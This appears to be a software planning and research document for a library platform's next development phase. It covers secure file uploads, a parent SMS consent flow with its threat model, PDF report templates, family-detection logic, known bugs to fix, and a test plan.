| `AiAuditLog` (single source) | Plan 04-03 + Plan 05-05 | Every approve/reject/freeze/mukofot/consent/address-change writes a row |
| `IpWhitelistGuard` | Plan 03-01 | NOT needed — Phase 6 has no webhook endpoints |
| `RedisLockService.tryAcquire` | Plan 04-01 + 05-05 leader lock | School weekly cron + family monthly cron use leader-lock pattern to prevent 3-replica fan-out |
| `maskNameIfMinor` (privacy-mask.util.ts) | Plan 03-01 + 03-04 | Apply to Top-50 family members (under-14 child in a family) + school PQ-9 PDF student names (under-14) |
| `subscription.status` gate | Phase 4 | Before allowing PQ-9 PDF / accreditation PDF / quarterly report export, assert `library.subscription.status === ACTIVE` (for OTM/IDORA paid plans). MAKTAB and MAH have GOV-funded subscriptions per CLAUDE.md §XIII.1 — auto-active. Use `Library.subscriptions[]` reverse lookup |

---

## File Upload Strategy

**Pattern:** Backend-proxied multipart upload via `@nestjs/platform-express FileInterceptor` (already installed). Reject anything that fails MIME sniff.

### Endpoint design

```ts
// apps/backend/src/modules/club/club.controller.ts (NEW)
@Post(":clubId/debates/:debateId/media")
@Roles(MUASSASA_ADMIN, KLUB_RAHBARI)
@UseInterceptors(FileInterceptor("file", {
  limits: { fileSize: 50 * 1024 * 1024 }, // 50MB hard cap
}))
async uploadDebateMedia(
  @Param("clubId") clubId: string,
  @Param("debateId") debateId: string,
  @UploadedFile() file: Express.Multer.File,
  @CurrentUser() user: AuthenticatedUser,
) {
  // 1. scope guard (assertInstitutionInScope via club lookup)
  // 2. file-type sniff (file-type.fromBuffer(file.buffer))
  // 3. MIME whitelist: image/jpeg, image/png, image/webp, video/mp4, video/quicktime
  // 4. Per-debate cap: count existing DebateMedia rows, reject if >= 4
  // 5. MinIO putObject(bucket: "debate-media", key: `${institutionId}/${debateId}/${cuid()}.${ext}`)
  // 6. Sharp.resize(200, 200) → thumbnail putObject
  // 7. Prisma.debateMedia.create({...}) + Prisma.debate.update({mediaUrls: { push: url }})
  // 8. AiAuditLog row
}
```

### MIME whitelist + magic-byte verification

The `Content-Type` header on multipart parts is **client-supplied and forgeable**. Phase 2 Plan 02-04 books-import already learned this lesson with XLSX. Use:

```ts
import { fileTypeFromBuffer } from "file-type";

const detected = await fileTypeFromBuffer(file.buffer);
const ALLOWED_MIMES = new Set([
  "image/jpeg",
  "image/png",
  "image/webp",
  "video/mp4",
  "video/quicktime",
]);
if (!detected || !ALLOWED_MIMES.has(detected.mime)) {
  throw new BadRequestException("Fayl turi qabul qilinmaydi");
}
```

### Storage layout (MinIO bucket plan)

| Bucket | Purpose | Lifecycle |
|--------|---------|-----------|
| `debate-media` | Club debate photo/video | Retain 5 years per audit-log retention (CLAUDE.md §VIII.4) |
| `bookcorner-photos` | ORG-04 photos | Retain while institution active; purge 1 year after FROZEN |
| `readinghour-media` | ORG-03 photo/video | Retain 5 years |
| `debate-thumbs` | 200×200 thumbnails | Same lifecycle as parent |

### Cost projection (re-verify in Wave 0)

- 2000 schools × ~1 debate/month × ~30MB avg = 60 GB/month new media. Over 5 years: 3.6 TB.
- MinIO storage cost on Unicon.uz approximately $0.02/GB-month → $72/month at steady state.
- **NOT** a V1 blocker. Lifecycle rules can compress old media to lower-cost cold storage if budget tightens.

### Service-layer enforcement of SCH-05 "mandatory media"

Right now `ClubService.createDebate` (club.service.ts:235-263) accepts `mediaUrls` array unconditionally. Change to require **debate creation in two phases**: (a) create with `status: 'DRAFT'`, (b) upload >=1 media, (c) `PATCH /debates/:id/finalize` flips to `PUBLISHED`. Quarterly reports only count PUBLISHED debates. School PQ-9 PDF embeds only PUBLISHED. Add `Debate.status` field — or simpler: hold off creation until the first upload succeeds, return debateId only after upload completes. **Recommend pattern A (DRAFT→PUBLISHED)** because it lets KLUB_RAHBARI capture metadata first while teachers run the debate, then upload evidence on a phone.

---

## Parent SMS Consent Flow

**Why redesign:** Current code (club.service.ts:445) sends *"HA — {memberId} yuborin"* SMS reply expecting parent to send back `HA <memberId>`. Eskiz.uz delivery model + Uzbek mobile carrier shortcode-reply costs make this unreliable. CLAUDE.md mandates the SMS itself; UX of parental confirmation can be improved without violating the directive.

### New flow

```
1. KLUB_RAHBARI calls POST /club/{clubId}/members { userId, parentPhone }
     ↓
2. ClubService.addMember:
     • compute age from user.dob
     • if age < 18 AND parentPhone required → continue, else 400
     • create ClubMember { status: PENDING, parentConsented: false, parentPhone }
     • mint nonce = crypto.randomBytes(16).toString('hex')  // 32-char hex
     • bcrypt.hash(nonce, 10) → ClubMemberConsentToken.tokenHash
     • expiresAt = now + 48h
     • dispatch SMS via NOTIFICATION_QUEUE:
       "SIFAT LIBRARY: {childName} farzandingiz '{clubName}' klubiga taklif qilingan.
        Tasdiqlash: sifat.uz/uz-Latn/club/consent?t={nonce}. Muddati 48 soat."
     ↓
3. Parent clicks link → Next.js /uz-Latn/club/consent?t=…
     • SSR page reads token
     • Renders "{childName} • {clubName} • [Roziman] [Rad etaman]" CTA
     ↓
4. POST /club/consent { token, action: 'APPROVE' | 'REJECT' }
     • ClubService.confirmConsentByToken:
       - find ClubMemberConsentToken where expiresAt > now AND consumedAt IS NULL
       - bcrypt.compare(token, row.tokenHash) — constant-time
       - INTERACTIVE $transaction:
         · tx.clubMember.update {status: ACTIVE, parentConsented: true, joinedAt: now}
         · tx.clubMemberConsentToken.update {consumedAt: now}
         · tx.aiAuditLog.create {scope: USER, scopeId: userId, issueType: 'PARENT_CONSENT_APPROVED'}
     • If action=REJECT → status=LEFT + audit row
     • Send FCM push to KLUB_RAHBARI (DeviceToken from Plan 05-04)
     ↓
5. If 48h elapses without consent:
     • @Cron("0 */6 * * *") tokenExpiryScan:
       - For each expired+unconsumed token:
         · tx.clubMember.update {status: 'LEFT', leftAt: now}
         · tx.aiAuditLog.create {issueType: 'PARENT_CONSENT_EXPIRED'}
```

### Threat model

| Threat | Mitigation |
|--------|-----------|
| Token guess (brute-force) | 128-bit nonce + bcrypt hash + per-IP rate-limit on `/club/consent` (10/hr) |
| Replay | `consumedAt` single-use field |
| Token in URL leaks (browser history) | Acceptable for V1; expires 48h. V2: short-lived JWT in cookie |
| Wrong parent receives SMS (typo) | Parent phone is validated at addMember; mismatch → no action possible (token won't be on right device). Audit log captures bad attempts |
| Forgery of consent by club leader | Club leader doesn't have nonce (only stored as bcrypt hash + sent via SMS to parent phone only) |

---

## PQ-9 PDF Template Design

**Single-template approach** (Plan 05-08 RPT-01 already establishes this pattern). The `PdfService.buildMonthlyReportHtml` overload accepts an extended `ReportData` shape. Add Phase 6 needs.

### Proposed extension to the overload

```ts
// apps/backend/src/modules/admin/report-data.service.ts (EXTEND)
export interface Pq9SchoolReport extends ReportData {
  scope: "MAKTAB";
  jadidlarSection: {
    clubs: Array<{
      name: string;
      memberCount: number;
      quarterDebates: number;
      thumbnails: string[]; // base64 data-URLs of debate photos
      lastDebateAt: string | null;
    }>;
    inactiveClubs: Array<{ name: string; daysSince: number }>;
  };
  goalAchievement: {
    target: number;
    achieved: number;
    rate: number;
  };
}

export interface Pq9IdoraReport extends ReportData {
  scope: "IDORA";
  bookCorner: { isActive: boolean; lastVerified: Date | null; photos: string[] };
  readingHours: { thisMonth: number; total: number; lastEventAt: Date | null };
  mvp: { userName: string; department: string | null; avgRi: number; booksRead: number } | null;
  rankingTop10: Array<{ rank: number; userName: string; department: string | null; avgRi: number; booksRead: number }>;
  profBooks: Array<{ title: string; author: string; isRequired: boolean }>;
}

export interface Pq9OtmReport extends ReportData {
  scope: "OTM";
  byFaculty: Array<{ faculty: string; studentCount: number; avgRi: number }>;
  digitalLibraryChecklist: Array<{ criterion: string; status: "PASS" | "FAIL"; note?: string }>;
  profBooks: Array<{ title: string; author: string; isRequired: boolean }>;
}
```

### Render rules

- **All DB strings**: pass through `escapeHtml` (already used by overload at pdf.service.ts:111-128).
- **Photo thumbnails**: `<img src="data:image/jpeg;base64,..." style="max-width:200px">`. Embed only the first 3 per club (PDF page count budget).
- **K-anonymity**: classes with `< 5` students show `—` for avgRi (apply `Plan 05-03 fix` threshold).
- **Mukofot taklifi block (IDORA)**: top-1 MVP rendered with `<span class="badge">🏆 PQ-9 §9b(d) mukofot taklifi</span>`. AiAuditLog `MUKOFOT_TAKLIFI` row already exists.
- **Generated-at timestamp**: `new Date().toLocaleDateString("uz-UZ")` already on watermark.
- **Subscription gate (OTM/IDORA only)**: report generation fails with 402 if `library.subscriptions[latest].status !== ACTIVE`. MAKTAB/MAH bypass per CLAUDE.md §XIII.

### Phase 6 PDF endpoints

| Endpoint | Auth | Notes |
|----------|------|-------|
| `GET /school/institutions/:id/pq9-report` | School/Tuman/Viloyat/Super admin | Already exists; refactor data assembly |
| `GET /idora/:institutionId/report/pq9` | Super/Muassasa admin | Refactor unsafe HTML |
| `GET /otm/:id/report/accreditation` | Super/Muassasa admin | Refactor unsafe HTML; add per-faculty section |
| `GET /club/:clubId/quarterly-report` | Klub rahbari + above | NEW endpoint |
| `GET /family/:familyId/profile` (NOT PDF — public HTML page) | Public | k-anonymity applied to under-14 members |

---

## Family Detection Algorithm

### Algorithm

```ts
// FamilyService.detectAndSuggestFamily (EXTEND)
async detectAndSuggestFamily(userId: string) {
  const user = await this.replica.user.findUnique({
    where: { id: userId },
    include: { address: true },
  });
  if (!user || !user.address) return null;

  // Q3: opt-IN gate
  if (!user.familyDetectionEnabled) return null;

  // Hard match: same 6-tuple
  const candidates = await this.replica.user.findMany({
    where: {
      id: { not: userId },
      familyId: null,
      status: "ACTIVE",
      familyDetectionEnabled: true,        // both sides opt-IN
      address: {
        viloyatId: user.address.viloyatId,
        tumanId: user.address.tumanId,
        mahallaId: user.address.mahallaId,
        house: user.address.house,
        apartment: user.address.apartment,
      },
    },
    select: { id: true, name: true, sifatId: true },
    take: 10,  // sanity cap
  });

  if (candidates.length === 0) return null;

  // CLAUDE.md §V.4 — anonymize under-14 candidates' surfaces
  // (the suggestion page is profile-private, but defense-in-depth)
  return {
    suggestion: true,
    sameHouseholdUsers: candidates,
    message: `${candidates.length} ta yaqin foydalanuvchi topildi. Oila yaratmoqchimisiz?`,
  };
}
```

### Disambiguation

- **Dormitory** (multiple unrelated students at same address): opt-IN gate handles. Default OFF.
- **Apartment complex with shared building entrance**: `house` and `apartment` are independent fields. If users enter "12" for building + "3" for apt, only those who match BOTH suggest each other.
- **Apartment number typo**: not handled in V1. Two users with `apartment="3"` and `apartment="3a"` won't match — acceptable.
- **Address change** mid-membership: handled by `AddressChangeRequest` flow (FAM-06). If approved, user's `addressId` updates and prior household neighbors no longer match.

### Privacy posture (Q3 baked)

- Toggle `User.familyDetectionEnabled` defaults to FALSE on registration.
- Profile page exposes: *"Oilamni topishga ruxsat bering — bir xil manzildagi foydalanuvchilarni topib taklif qilamiz"*.
- When enabled, NO automatic add — only suggestion. User must explicitly create family + invite each candidate.
- Audit log row when toggle flipped (forensic trail if user later disputes data exposure).

---

## Runtime State Inventory

Phase 6 is **mostly greenfield-on-scaffold** but contains **two true rename/refactor surfaces**:

| Category | Items Found | Action Required |
|----------|-------------|-----------------|
| Stored data | None — no string renames | None |
| Live service config | None | None |
| OS-registered state | **Phase 3 cron `InstitutionalService.computeInstitutionalRankings` (@Cron "0 3 * * *")** writes daily to SchoolRating + OrgRating. Phase 6 adds **NEW** weekly cron in `SchoolService.computeSchoolRatings`. Both will fire on overlapping days | **R-DUP resolution:** delete `SchoolService.computeSchoolRatings` write path, leave Phase 3 cron as sole writer. Phase 6 cron reads-only or is deleted entirely. Document in plan |
| Secrets/env vars | NEW: `MINIO_ENDPOINT`, `MINIO_ACCESS_KEY`, `MINIO_SECRET_KEY`, `MINIO_BUCKET_DEBATES`, `MINIO_BUCKET_BOOKCORNERS`, `MINIO_BUCKET_READINGHOURS`, `MINIO_USE_SSL` | Wave 0 task adds to Vault + `.env.example`. Operator supplies pre-deploy |
| Build artifacts | NEW package install: `minio`, `file-type`, `sharp`. `sharp` carries pre-built binaries per Node ABI — verify `apps/backend/node_modules/sharp/build/Release/sharp.node` exists post-install on Alpine container | Wave 0 task validates Docker build still passes |

The canonical question — **"After every file in the repo is updated, what runtime systems still have the old string cached, stored, or registered?"** — answer: **nothing**, because Phase 6 introduces new fields rather than renames. The only risk is the cron overlap which is a logic dedup, not a state migration.

---

## Common Pitfalls

### Pitfall 1: Duplicate cron writes to OrgRating / SchoolRating (R-DUP)

**What goes wrong:** Phase 3 `InstitutionalService.computeInstitutionalRankings` (daily 03:00) writes both SchoolRating (MAKTAB + OTM) and OrgRating (IDORA) per Plan 03-03. `SchoolService.computeSchoolRatings` (Phase 6 EXTEND) and `IdoraService.computeAndSaveRating` would write the same rows again. Different formulas → flapping leaderboard.

**Why it happens:** The Phase 6 scaffold landed BEFORE Plan 03-03 InstitutionalService landed. Nobody reconciled.

**How to avoid:** Wave 0 task ASSERTS Phase 3 InstitutionalService is the sole writer of `SchoolRating` + `OrgRating`. `SchoolService.computeSchoolRatings` and `IdoraService.computeAndSaveRating` must become READ-only views (or be deleted). If Phase 6 needs different formula nuances, fold them INTO Phase 3 `InstitutionalService.computeForType` rather than parallel writes.

**Warning signs:** SchoolRating row count grows by 2× per institution per month; `rank` column oscillates between cron runs.

### Pitfall 2: HTML-injection via institution name in PQ-9 PDFs

**What goes wrong:** `IdoraService.generatePq9Report` (idora.service.ts:368) and `OtmService.generateAccreditationReport` (otm.service.ts:249) interpolate `institution.name`, `b.title`, `b.author`, `mvp.userName`, `r.userName`, `r.department` directly into HTML strings rendered by Puppeteer. Any DB-stored string with `<script>` executes.

**Why it happens:** Both services were scaffolded BEFORE Plan 04-03 audit-fix taught everyone to use `escapeHtml`.

**How to avoid:** Refactor to route through `pdfService.buildMonthlyReportHtml` (already uses `escapeHtml`) OR import `escapeHtml` from `common/utils/escape-html.util.ts` and wrap every interpolation. Add CI lint that rejects `template-literal HTML strings` containing `${data.*}` in `*.service.ts` (similar to the existing `lint:replica` check at apps/backend/package.json:16).

**Warning signs:** PDF generation succeeds even when library/employee name contains `<` characters; rendered PDF contains broken HTML or executed scripts (visible as data exfiltration via `fetch()`).

### Pitfall 3: UNI-01/UNI-02 silently return empty data (schema-mismatch bug)

**What goes wrong:** `OtmService.getStudents`, `approveStudent`, `getOtmStats` all query `where: { schoolId: institutionId, type: "STUDENT" }`. Schema's `User.universityId` is the OTM FK. Enum has `STUDENT_UNIVERSITY`, not `STUDENT`. Net result: **zero students** returned for every OTM in production. The OTM dashboard renders empty tables silently.

**Why it happens:** Scaffold author conflated `school` and `OTM` semantics. The OTM unit tests use `type: "STUDENT"` matching the buggy service, so all 450 lines of `otm.service.spec.ts` pass while the service is broken at runtime.

**How to avoid:** Wave 0 task fixes the field + enum literal in 1 file (otm.service.ts) + updates the spec to use `STUDENT_UNIVERSITY` correctly. Add a smoke test that boots NestJS with a seeded OTM + 5 students and asserts `getStudents` returns 5 rows.

**Warning signs:** Empty OTM dashboards in production; `getOtmStats.students.total = 0` despite seeded users.

### Pitfall 4: TOCTOU race on FAM-06 "one user = one family"

**What goes wrong:** Two concurrent `respondToInvite` accepts arrive for the same `userId` (e.g., user accepts on phone + web simultaneously). `family.service.ts:209` reads `user.familyId` outside any transaction. Both checks pass `familyId == null`; both updates succeed; user ends up with `familyId` set to the second invite's family + audit log shows two ACCEPTED rows. The first family's avg-RI calculation now silently excludes the user.

**Why it happens:** The check + update is not atomic.

**How to avoid:** Wrap in interactive `$transaction(async (tx) => { const fresh = await tx.user.findUnique(…); if (fresh.familyId) throw new BadRequestException('Already in family'); await tx.user.update({ familyId: invite.familyId }); … })`. Postgres serializable isolation OR `SELECT ... FOR UPDATE` via `$queryRaw` would be belt-and-suspenders.

**Warning signs:** Audit log shows ACCEPTED rows for two FamilyInvites pointing to different families with the same inviteeId.

### Pitfall 5: Family RI 30-day waiting uses User.createdAt instead of FamilyMembership.joinedAt

**What goes wrong:** A 3-year-old user who joins a family yesterday has `User.createdAt > 30 days ago` → counted in family avg RI immediately. CLAUDE.md §IV.4 explicitly says "Oilaga qo'shilgandan **30 kun** o'tgach reyting hisoblanadi" (after joining FAMILY, not after creating account).

**Why it happens:** Scaffold conflated the two timestamps. `family.service.ts:300` uses `User.createdAt` as the filter.

**How to avoid:** Migration introduces `FamilyMembership.joinedAt`. Backfill with `User.createdAt` for existing memberships (acceptable approximation since most rows are pre-V1). New memberships use real join time. `_computeSingleFamilyRating` uses `FamilyMembership.joinedAt`.

**Warning signs:** Spike in monthly family RI when a high-RI member joins a low-RI family; complaints from low-rank families that a newly-joined power-reader bumps their score artificially.

### Pitfall 6: Parent SMS consent token leaks via browser history

**What goes wrong:** Parent clicks `sifat.uz/uz-Latn/club/consent?t={nonce}` → token visible in browser history + any shoulder-surfer. Single-use mitigates replay, but pre-consumption window allows snooping.

**Why it happens:** Tokens in URL query strings are an industry-standard tradeoff. SMS deep-link UX requires URL-embedded tokens.

**How to avoid:** 48-hour TTL + single-use + bcrypt-hashed storage. Document in V2 backlog: switch to POST-form with hidden token (consume immediately on landing, redirect to consent page with cookie). Acceptable for V1.

**Warning signs:** None observable without explicit threat modeling — accept and document.

---

## Code Examples

Verified patterns from the existing codebase that Phase 6 must mirror.

### Pattern: scope assertion before cache (Phase 5 → Phase 6)

```ts
// Source: apps/backend/src/modules/admin/admin.service.ts (Plan 05-02 pattern)
async getTumanStats(user: AuthenticatedUser, tumanId: string) {
  // 1. resolve target's viloyat for scope check
  const tuman = await this.replica.tuman.findUnique({
    where: { id: tumanId },
    select: { viloyatId: true },
  });
  if (!tuman) throw new NotFoundException("Tuman topilmadi");

  // 2. scope guard BEFORE cache.remember — forbidden user must not poison cache
  assertTumanInScope(user, tumanId, { resolvedViloyatId: tuman.viloyatId });

  return this.cache.remember(`stats:tuman:${tumanId}`, 900, async () => { ... });
}
```

Phase 6 application (`assertInstitutionInScope`):

```ts
// apps/backend/src/common/utils/admin-scope.util.ts (EXTEND in Wave 0)
export function assertInstitutionInScope(
  user: ScopedUser,
  requestedInstitutionId: string,
  resolved: { viloyatId: string; tumanId: string; type: InstitutionType }
): void {
  const role = user.role as UserRole;
  if (role === UserRole.SUPER_ADMIN || role === UserRole.BUXGALTER) return;

  if (role === UserRole.MUASSASA_ADMIN) {
    const own =
      (resolved.type === "MAKTAB" && user.schoolId === requestedInstitutionId) ||
      (resolved.type === "OTM" && user.universityId === requestedInstitutionId) ||
      (resolved.type === "IDORA" && user.organizationId === requestedInstitutionId);
    if (!own) {
      throw new ForbiddenException("Scope mismatch: muassasa boshqarish ruxsat yo'q");
    }
    return;
  }
  if (role === UserRole.VILOYAT_ADMIN) {
    if (user.address?.viloyatId !== resolved.viloyatId) {
      throw new ForbiddenException("Scope mismatch: viloyat doirasidan tashqarida");
    }
    return;
  }
  if (role === UserRole.TUMAN_ADMIN) {
    if (user.address?.tumanId !== resolved.tumanId) {
      throw new ForbiddenException("Scope mismatch: tuman doirasidan tashqarida");
    }
    return;
  }
  throw new ForbiddenException("Scope mismatch: muassasaga ruxsat yo'q");
}
```

### Pattern: subscription gate before paid feature (Phase 4 → Phase 6)

```ts
// Source: apps/backend/src/modules/payment/subscription.service.ts:43-49
// Plan 04-03 ALLOWED_TRANSITIONS pattern
async assertSubscriptionActive(institutionId: string, scope: 'OTM' | 'IDORA') {
  const lib = await this.replica.library.findFirst({
    where: {
      institutionId,
      type: scope === 'OTM' ? 'UNI' : 'ORG',
    },
    include: {
      subscriptions: {
        orderBy: { createdAt: 'desc' },
        take: 1,
      },
    },
  });
  if (!lib) return; // no library bound → no subscription gate (legacy)
  const sub = lib.subscriptions[0];
  if (!sub) throw new PaymentRequiredException('Subscription required');
  if (sub.status !== 'ACTIVE' && sub.status !== 'TRIAL') {
    throw new PaymentRequiredException('Subscription is not active');
  }
}
```

### Pattern: interactive transaction (Phase 2 → Phase 6)

```ts
// Source: apps/backend/src/modules/transactions/transactions.service.ts:Plan 02-02
// FAM-06 one-family enforcement
await this.prisma.$transaction(async (tx) => {
  const fresh = await tx.user.findUnique({
    where: { id: userId },
    select: { familyId: true },
  });
  if (fresh?.familyId) {
    throw new BadRequestException("Siz allaqachon boshqa oila a'zosisiz");
  }
  await tx.user.update({
    where: { id: userId },
    data: { familyId: invite.familyId },
  });
  await tx.familyInvite.update({
    where: { id: inviteId },
    data: { status: "ACCEPTED" },
  });
  await tx.familyMembership.create({
    data: { userId, familyId: invite.familyId },
  });
  await tx.aiAuditLog.create({
    data: {
      scope: "USER",
      scopeId: userId,
      issueType: "FAMILY_JOIN",
      severity: "LOW",
      analysis: `User joined family ${invite.familyId}`,
      recommendation: "—",
    },
  });
});
```

---

## State of the Art

| Old Approach | Current Approach | When Changed | Impact |
|--------------|------------------|--------------|--------|
| Inline HTML interpolation in PDFs | `pdfService.buildMonthlyReportHtml` + escapeHtml | Plan 04-03 + Plan 05-08 fix | Phase 6 must follow; raw HTML banned |
| `prisma.X.findMany` for heavy reads | `replica.X.findMany` via `PrismaReplicaService` | Plan 02-03 RI-01 | Phase 6 family/idora/otm/school heavy reads must route through replica |
| Cron auto-block user | FLAGGED + admin review queue | Plan 02-04 FRAUD-03 | Phase 6 reject endpoints must mirror — never auto-block, always queue |
| SMS reply with code | Deep-link with token | NEW for Phase 6 | Established UX best practice; old `HA <id>` pattern from Plan 03-04 is being retired |
| Hard `localStorage.getItem('access_token')` | HttpOnly cookie + `credentials: 'include'` | Plan 01-04 INFRA-02 | Phase 6 frontend must use cookie pattern (school/idora/otm/family dashboards already do — verified school/page.tsx:59) |
| No leader lock on crons | RedisLockService for fan-out prevention | Plan 05-05 | Phase 6 weekly/monthly crons must wrap with leader lock |

**Deprecated/outdated:**
- "Reply HA + memberId" for parent consent (club.service.ts:445) — replace with deep-link token (Q-decision A2 above).
- Direct interpolation in PDF HTML (idora.service.ts:368, otm.service.ts:249) — replace with escapeHtml/template overload.

---

## Assumptions Log

> All `[ASSUMED]` claims this research surfaced. Discuss-phase / planner must verify before committing.

| # | Claim | Section | Risk if Wrong |
|---|-------|---------|---------------|
| A1 | `minio` JS SDK v8.x is the latest stable | Standard Stack | Wrong version pinned → reinstall in Wave 0 fix (low impact) |
| A2 | `sharp` v0.33.x runs on the Alpine Docker base image already in use (Phase 1) | Standard Stack | If glibc/musl ABI fails → `--platform linuxmusl` install flag needed; Wave 0 task verifies docker build |
| A3 | `file-type` v19.x ESM-only import works with the project's CommonJS Nest config | Standard Stack | If ESM blocks → fall back to `mime-types` for less-precise detection (acceptable degradation) |
| A4 | Phase 1's `docker-compose.yml` defines a MinIO service container | File Upload Strategy | If absent → Wave 0 adds it (small extra task) |
| A5 | Per-user `User.familyDetectionEnabled` boolean ADDed via migration won't break Plan 02-03 RI batch | Family Detection | Adding a nullable column with default false is safe; verify in Wave 0 |
| A6 | Phase 3 `InstitutionalService.computeForType(MAKTAB)` actually writes correct SchoolRating rows (matches what Phase 6 dashboard reads) | Pitfall R-DUP | If mismatched → Phase 6 weekly cron stays; Phase 3 cron narrowed |
| A7 | The `school.service.spec.ts` (204 lines) covers `computeSchoolRatings` well enough that deleting that method (R-DUP fix) won't silently regress | Build/Extend SCH-07 | If specs depend on duplicate code path → spec updates in same plan |
| A8 | Family invites use `parentPhone` resolved at addMember time; not stored in `User.familyId` | FAM-06 Pitfall | If field semantics differ → race fix unaffected (transaction pattern is independent) |
| A9 | 50MB per file × 4 files cap fits within Eskiz SMS quota economy AND backend memory budget (Node 20 default 2GB) | File Upload Strategy | If too high → drop to 20MB per file; mobile-friendly anyway |
| A10 | Akkreditatsiya hisoboti per CLAUDE.md uses per-faculty breakdown; per Q7 individual student data excluded | UNI-03 | If accreditation requires named lists → relax k-anonymity for SUPER_ADMIN role only |
| A11 | All Phase 6 modules already are listed under `app.module.ts` imports (verified lines 22-29) | Executive Summary | Verified; no risk |
| A12 | Parent SMS consent deep-link page can live at `apps/frontend/app/[locale]/club/consent/page.tsx` (NEW) without auth gate | Parent SMS Consent Flow | Public page is intentional — auth happens via token verification |

---

## Open Questions (RESOLVED) — Q decisions baked

The orchestrator pre-approved 7 Q decisions. Each is now an authoritative input to the plan:

1. **Debate evidence (Q1):** photo OR video — at least 1 of either required for `Debate.status = PUBLISHED`. Max 50MB per file. Max 4 files per debate. Accepted MIME: `image/jpeg`, `image/png`, `image/webp`, `video/mp4`, `video/quicktime`. *Resolved as part of File Upload Strategy.*
2. **20-book goal threshold (Q2):** V1 hardcoded to 20 (CLAUDE.md §VII). `Club.goal` field exists (schema.prisma:632) but V1 ignores customisation. Configurable per club deferred to V2.
3. **Family privacy (Q3):** opt-IN only. `User.familyDetectionEnabled` BOOL DEFAULT FALSE. Profile toggle exposes; suggestion endpoint returns null when off.
4. **30-day waiting period (Q4):** hard server enforcement via `FamilyMembership.joinedAt` (NEW field). Migration backfills from `User.createdAt`. New memberships use real join time.
5. **PQ-9 report public exposure (Q5):** NOT public. Only `SUPER_ADMIN`, `MUASSASA_ADMIN` of the scope, `TUMAN_ADMIN` for institutions in their tuman, `VILOYAT_ADMIN` for institutions in their viloyat can download. Public reyting page shows AGGREGATED metrics only (e.g., `/top/maktablar` rank + name + score).
6. **ORG Mukofot taklifi (Q6):** `AiAuditLog{issueType:'MUKOFOT_TAKLIFI', severity:LOW, scopeId: userId, analysis: '{name} is top-1 reader of {institutionName} in {month}'}` + email to HR admin via `mail.sendEmail` with reasoning. Admin manually executes the mukofot; no auto-disbursement.
7. **Akkreditatsiya PDF (Q7):** aggregated faculty-level data only. No individual student PII. K-anonymity threshold applied to faculty buckets < 5 (`—` shown).

---

## Open Questions (REMAINING)

These need user input during `gsd-discuss-phase` (only NEW questions beyond Q1-Q7):

1. **OQ-1 (HIGH):** Are existing Phase 3 `InstitutionalService` write semantics for `OrgRating` (one row per employee per month with `isMvp:true` on rank-1) sufficient for Phase 6 dashboard reads? Or does Phase 6 want a different aggregation (e.g., per-department leaderboards)? **Recommendation:** keep Phase 3 as sole writer; Phase 6 adds a department-grouped READ over the same OrgRating rows. Lock in CONTEXT.md.
2. **OQ-2 (MED):** For `AddressChangeRequest` (FAM-06) — does the tuman admin need to attach an evidence document (e.g., uplab dalolatnomasi) at approval time? V1 default: free-text `reason` field; document upload deferred to V2.
3. **OQ-3 (MED):** UNI-04 academic progress endpoint — should it surface to the student themselves (self-view) or only to faculty admin? **Recommendation:** student-self for the student; aggregated only for faculty admin.
4. **OQ-4 (LOW):** ClubMember parent consent token — should the deep-link page show the parent additional information (full name of child, club leader contact phone)? Or only the minimum to decide? **Recommendation:** minimum — protects against SMS interception fishing.
5. **OQ-5 (LOW):** Are there CLAUDE.md-implied UI requirements for the family public profile that are NOT in CONTEXT.md (e.g., "show photo of family")? Phase 6 V1: no photo uploads to family profile. If user disagrees, add as deferred.
6. **OQ-6 (LOW):** Should the inactive-club alert (SCH-09) trigger when ALL members of a club are < 14 yo to avoid PII exposure in the alert message? **Recommendation:** alert recipient is the `KLUB_RAHBARI` (teacher), so message can include student count without names. No anonymization needed at this layer.

---

## Environment Availability

| Dependency | Required By | Available | Version | Fallback |
|------------|------------|-----------|---------|----------|
| MinIO server | All file uploads | ✓ (docker-compose Phase 1) | (likely 2024.x) | Local filesystem fallback for dev (`MINIO_USE_FS_FALLBACK=true` env) |
| Eskiz.uz SMS | Parent consent SMS | ✓ wired (Plan 01-01) | direct fetch client | Dev no-op via `EskizClient` — already works in dev |
| Firebase FCM | Teacher approval push | ✓ wired (Plan 05-04) | `firebase-admin` already installed | Dev no-op (no token registered = no-op already) |
| Eskiz/SMTP for HR mukofot email | ORG-05 | ✓ Plan 05-04 `mail.sendEmail` | nodemailer | Dev no-op via `ADMIN_NOTIFICATION_EMAILS` env |
| PostgreSQL 15 + replica | All heavy reads | ✓ (Phase 1 INFRA-10) | 15.x | Falls back to primary (Plan 02-03 pattern) |
| Redis | leader locks + cache | ✓ (Phase 1) | 7.x | Cache miss-through; lock contention unsafe — required |
| Sharp native binaries | thumbnail generation | NEW install Wave 0 | 0.33.x | If install fails → skip thumbnail (PDF shows full image; size budget risk) |
| Puppeteer Chromium | PDF render | ✓ Phase 4 | 22.x | — |

**Missing dependencies with no fallback:** none observed.

**Missing dependencies with fallback:** Sharp (skip thumb if fail — gracefully degrades, PDF just larger).

---

## Validation Architecture

### Test Framework

| Property | Value |
|----------|-------|
| Framework | Jest 29 + ts-jest (project standard since Phase 1) |
| Config file | `apps/backend/jest.config.ts` (root) |
| Quick run command | `cd apps/backend && npm test -- --testPathPattern=school\|family\|idora\|otm\|club` |
| Full suite command | `cd apps/backend && npm test` |

### Phase Requirements → Test Map

Target: roughly **+150 new tests** across the four modules + shared MinIO upload. Existing per-module spec sizes: school 204, family 477, club 677, idora 785, otm 450 (total 2593). Phase 6 should land ~+150 new test cases bringing the subset to ~2750. Project-wide backend suite baseline as of Plan 03-04 close was 867/867; aim for ≥1010/1010 by Phase 6 close.

| Req ID | Behavior | Test Type | Automated Command | File Exists? |
|--------|----------|-----------|-------------------|-------------|
| SCH-01 | scope guard rejects sibling-institution admin | unit | `npm test -- school.service.spec.ts -t "scope rejects sibling"` | ❌ Wave 0 add |
| SCH-02 | reject student with reason writes audit log | unit | `npm test -- school.service.spec.ts -t "reject with reason"` | ❌ Wave 1 |
| SCH-03 | club CRUD + delete + activation toggle | unit | `npm test -- club.service.spec.ts` | ⚠️ extend existing (club spec is 677 lines) |
| SCH-04 | parent consent token mint + verify + expire | unit + integration | `npm test -- club-consent.spec.ts` | ❌ NEW spec |
| SCH-05 | debate without media → 400 | unit | `npm test -- club.service.spec.ts -t "debate requires media"` | ❌ extend |
| SCH-05 | debate media MIME-sniff rejects fake JPG | integration | `npm test -- club-media.integration.spec.ts` | ❌ NEW integration spec |
| SCH-06 | 20-book goal progress per member | unit | `npm test -- club.service.spec.ts -t "goal progress"` | ✅ exists, extend |
